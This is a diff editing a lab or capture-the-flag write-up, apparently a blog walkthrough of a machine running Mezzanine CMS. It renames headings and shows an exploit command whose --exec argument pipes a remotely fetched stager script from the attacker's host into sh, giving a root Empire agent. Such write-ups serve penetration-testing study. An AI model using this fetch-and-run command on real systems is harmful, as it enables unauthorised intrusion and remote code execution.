@@ -22,7 +22,7 @@ categories:
 
 ---
 
-## Recon
+## Enumeration
 
 ### Nmap
 
@@ -42,10 +42,6 @@ PORT     STATE SERVICE VERSION
 8000/tcp open  http    nginx 1.16.1
 ```
 {{< /collapse >}}
-
----
-
-## Enumeration
 
 ### Port 80 - Mezzanine CMS
 
@@ -85,7 +81,7 @@ Confirmed -- we have code execution.
 
 ### Getting a Shell via Empire
 
-The exploit behaves inconsistently with standard reverse shells, so I used **PowerShell Empire** (works on Linux targets too):
+The exploit behaves inconsistently with standard reverse shells, so I used **Empire** (works on Linux targets too):
 
 1. Launch Empire server & client
 2. Create and start an HTTP listener
@@ -98,7 +94,7 @@ The exploit behaves inconsistently with standard reverse shells, so I used **Pow
 
 ```bash
 python3 ./exploit.py --master 192.168.192.62 \
-  --exec "curl http://192.168.45.216:8000/java.sh | sh"
+  --exec "curl http://192.168.45.216:8000/stager.sh | sh"
 ```
 
 Agent calls back -- we're in as **root**. No privesc needed.
